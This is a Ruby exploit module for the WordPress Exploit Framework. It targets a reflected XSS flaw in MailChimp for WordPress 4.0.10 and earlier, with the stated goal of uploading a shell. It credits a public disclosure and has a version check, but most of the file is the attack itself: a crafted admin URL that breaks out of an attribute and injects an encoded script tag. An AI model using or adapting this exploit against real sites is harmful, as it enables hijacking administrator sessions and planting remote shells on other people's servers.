# frozen_string_literal: true

class Wpxf::Exploit::MailchimpForWpReflectedXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::ReflectedXss

  def initialize
    super

    update_info(
      name: 'MailChimp for WordPress <= 4.0.10 Reflected XSS Shell Upload',
      author: [
        'Tom Adams', # Discovery and disclosure
        'rastating'  # WPXF module
      ],
      references: [
        ['WPVDB', '8695']
      ],
      date: 'Dec 09 2016'
    )
  end

  def check
    check_plugin_version_from_readme('mailchimp-for-wp', '4.0.11')
  end

  def url_with_xss
    normalize_uri(
      wordpress_url_admin,
      'admin.php?page=mailchimp-for-wp-integrations&integration=">'\
      "%3Cscript%3E#{xss_ascii_encoded_include_script}%3C%2Fscript%3E"
    )
  end
end
